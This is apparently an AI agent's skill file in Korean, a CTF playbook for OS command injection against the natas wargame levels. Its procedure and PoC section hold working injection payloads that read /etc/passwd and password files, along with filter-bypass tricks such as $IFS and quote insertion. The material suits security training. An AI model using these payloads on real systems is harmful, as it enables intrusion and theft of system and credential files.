---
name: command-injection
description: OS 커맨드 인젝션으로 셸 명령 실행·파일 읽기
---
## When
서버가 입력을 셸 명령으로 실행(grep/ping/nslookup/변환기 등); 입력이 명령 출력에 섞임

## Tools
curl

## Procedure
1) 주입점 확인: 입력이 셸에 전달되는 기능(검색·핑·파일변환)
2) 메타문자 주입: `;` `|` `&` `$()` `` `` `` 개행; 주석 `#`으로 뒷부분 무력화
3) 필터 우회: `[;|&]` 차단 시 개행/`%0a`·`$IFS`·따옴표삽입(`c""at`)·`\` 이스케이프,
   문자 필터 시 프로그램 자체 기능 활용(예: grep으로 파일 내용 노출)
4) 블라인드면 아웃오브밴드(DNS/HTTP 콜백)·시간지연(`sleep`)으로 확인
5) 대상 파일 읽기로 플래그 확보

## PoC
```
# 직접 실행 (natas9류: passthru("grep -i $needle dict"))
?needle=.%20/etc/natas_webpass/natas10%20%23&submit=Search   # grep . <file> #
?needle=;cat /etc/passwd;

# [;|&] 필터 시 grep 자체로 파일 노출 (natas10류)
?needle=.* /etc/natas_webpass/natas11   # grep '.*' <dict> <target>

# 필터 우회 소품
$IFS 대신 공백; a=c;$a''at flag; c\at flag; {cat,flag}
```

## Pitfalls
공백 필터→`$IFS`/`${IFS}`/중괄호; 인용부호 안 주입은 먼저 `"`/`'` 탈출;
블라인드는 콜백/시간; 필터가 문자 기반이면 실행 프로그램(grep/find/awk) 기능으로 우회
